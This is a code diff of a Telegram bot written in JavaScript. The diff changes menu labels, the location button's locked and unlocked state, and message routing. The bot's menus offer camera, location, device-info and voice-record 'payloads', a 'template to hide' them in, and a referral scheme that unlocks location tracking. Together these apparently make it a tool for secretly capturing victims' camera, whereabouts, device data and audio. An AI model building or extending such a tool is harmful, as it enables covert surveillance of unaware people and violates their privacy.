@@ -74,11 +74,12 @@ async function getUserData(chatId) {
 
 async function showStartMenu(chatId) {
     const user = await getUserData(chatId);
+    const locationText = user.unlocked_location ? '📍 Location 🔓' : '📍 Location 🔒';
 
     const opts = {
         reply_markup: {
             keyboard: [
-                [{ text: '🚀 Start Task (Camera)' }, { text: '📍 Location' }],
+                [{ text: '🚀 Start Task (Camera)' }, { text: locationText }],
                 [{ text: '📱 Device Info' }, { text: '🎤 Voice Record' }],
                 [{ text: '🔗 Invite Friends' }, { text: '👤 My Profile' }],
                 [{ text: '🛠 Help' }]
@@ -254,6 +255,7 @@ bot.onText(/\/start(.*)/, async (msg, match) => {
 
 bot.onText(/^\/menu/, async (msg) => {
     const chatId = msg.chat.id;
+    userState[chatId] = { step: 'none' };
     try {
         const isMember = await checkMembership(msg.from.id);
         if (isMember) {
@@ -281,7 +283,7 @@ bot.on('callback_query', async (callbackQuery) => {
 
                 showStartMenu(chatId);
             } else {
-                bot.answerCallbackQuery(callbackQuery.id, { text: '❌ You haven\'t joined the channel yet! Please join first.', show_alert: true });
+                bot.answerCallbackQuery(callbackQuery.id, { text: '❌ You have not joined the channel yet!', show_alert: true });
             }
         }
         else if (callbackQuery.data === 'method_image') {
@@ -295,12 +297,7 @@ bot.on('callback_query', async (callbackQuery) => {
             bot.answerCallbackQuery(callbackQuery.id);
         }
         else if (callbackQuery.data === 'method_template') {
-            if (userState[chatId]) userState[chatId].step = 'none';
-            const templateKeyboard = Object.keys(templates).map(key => ([{ text: templates[key], callback_data: key }]));
-            bot.sendMessage(chatId, '<b>🎁 Select a Template to hide:</b>', {
-                parse_mode: 'HTML',
-                reply_markup: { inline_keyboard: templateKeyboard }
-            });
+            showTemplateMenu(chatId);
             bot.answerCallbackQuery(callbackQuery.id);
         }
         else if (templates[callbackQuery.data]) {
@@ -314,16 +311,16 @@ bot.on('callback_query', async (callbackQuery) => {
 });
 
 bot.on('message', async (msg) => {
+    if (!msg.text) return;
     const chatId = msg.chat.id;
     const text = msg.text;
 
-    if (!text) return; 
-    if (text.startsWith('/')) return; 
-
     try {
+        if (text.startsWith('/start') || text.startsWith('/menu') || text.startsWith('/help')) return;
+
         if (text === '🛠 Help') {
             sendHelpCommand(chatId);
-        } 
+        }
         else if (text === '🚀 Start Task (Camera)') {
             await showPayloadMenu(chatId, 'camera');
         }
@@ -333,7 +330,7 @@ bot.on('message', async (msg) => {
         else if (text === '🎤 Voice Record') {
             await showPayloadMenu(chatId, 'voice');
         }
-        else if (text === '📍 Location') {
+        else if (text === '📍 Location 🔒' || text === '📍 Location 🔓') {
             const user = await getUserData(chatId);
             if (user.unlocked_location) {
                 await showPayloadMenu(chatId, 'location');
